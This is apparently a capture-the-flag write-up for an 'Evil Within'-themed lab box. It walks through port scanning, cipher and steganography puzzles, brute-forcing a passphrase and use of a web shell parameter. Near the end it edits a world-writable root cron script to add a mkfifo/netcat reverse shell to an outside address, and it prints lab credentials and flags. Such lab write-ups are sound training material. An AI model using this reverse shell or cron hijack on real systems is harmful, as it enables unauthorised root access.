> Psycho Break | Evil Within theme

export IP=10.10.185.119

# Nmap

sudo nmap -A -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

# Gobuster


We have a link in source code `/sadistRoom` and there we have a key `532219a04ab7a02b56faafbec1a4c1ea`. We have a text `Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv`. And after some time we figure out that it is atbash cipher and we have the key `Grant_me_access_to_the_map_please`.

And now we have access the map. Now we have another 2 links. And here we have a hint `I think I'm having a terrible nightmare. Search through me and find it`. AN d running gobuster we got a sub-directory `/keeper`. And we are navigated to `escapefromkeeper.php`. There we are prompted to reverse the image.

And reversing it we find `st augustine lighthouse` and we have the key `48ee41458eb0b43bf82b986cecf3af01`.Now looking at the source code we are told that in the page there is a shell. Looks like it a parameter. Let's access it `?shell=ls` and again `?shell=ls ..` and we find 2 hashes. The 1st hash is a directory and we found the txt file.

And unzipping the file we have 2 file. A jpg file is present but is zip file instead. Renaming it to .zip Then extarcting again we have another 2 files. The wav file consists of morse code => Decoding it we have a message `SHOWME`. Now inspecting the image file.

## steghide

We have `thankyou.txt`. 

# FTP Details 

```
USER : joseph
PASSWORD : intotheterror445
```

Looks like program is an ELF executable file. On executong it asks for a word. And there is list of words in random.dic. 

# Steps to find the Passphrase

```
sudo chmod +x program 
strings random.dic > brute.txt
while read LINE; do ./program "$LINE"; done < brute.txt | grep Correct
kidman => Correct
```

./program kidman

```
kidman => Correct

Well Done !!!
Decode This => 55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33
```

It's a phone-keypad message. `k i d m a n s p a s s w o r d i s s o s t r a n g e`

Looks like we have the SSH username and password. But the password is all Caps `KIDMANSPASSWORDISSOSTRANGE`. 


# user.txt

```
4C72A4EF8E6FED69C72B4D58431C4254
```

# Privilege Escalation

In the crintab we have `/var/.the_eye_of_ruvik.py`. OOh! Let's see the privileges.

```
-rwxr-xrw- 1 root root 300 Aug 14 22:43 /var/.the_eye_of_ruvik.py
```

And replacing a reverse shell in the file 
```
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)

subprocess.call("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.107.21 1234 >/tmp/f",shell=True)
```
 we are root!!

# root.txt

```
BA33BDF5B8A3BFC431322F7D13F3361E
```